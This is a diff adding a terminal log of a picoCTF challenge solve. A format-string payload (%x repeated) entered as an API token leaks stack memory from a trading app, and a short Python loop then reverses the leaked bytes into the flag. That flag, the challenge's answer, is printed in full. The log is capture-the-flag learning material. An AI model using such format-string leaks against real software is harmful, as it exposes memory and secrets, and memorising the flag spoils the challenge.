@@ -1,0 +1,50 @@
+harsheen_5-picoctf@webshell:~$ nc mercury.picoctf.net 33411              
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+Buying stonks with token:
+9e80430804b00080489c3f7fa3d80ffffffff19e7e160f7fb1110f7fa3dc709e7f18019e804109e804306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffc0007df7fdeaf8f7fb14408fdd49001
+Portfolio as of Sun Feb 19 07:25:17 UTC 2023
+
+
+1 shares of AJSG
+2 shares of Y
+8 shares of ANM
+9 shares of LTDI
+14 shares of SR
+60 shares of XQD
+42 shares of EH
+29 shares of H
+84 shares of RJD
+1506 shares of SV
+Goodbye!
+
+
+
+ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿÀ}
+
+
+
+harsheen_5-picoctf@webshell:~$ python
+Python 3.10.6 (main, Aug 10 2022, 11:40:04) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿÀ}'
+>>> for i in range (0,len(s),4):
+...     print(s[i+3]+s[i+2]+s[i+1]+s[i], end='')
+... 
+Traceback (most recent call last):
+  File "<stdin>", line 2, in <module>
+IndexError: string index out of range
+picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6>>> 
+
+
+
+flag:picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
+
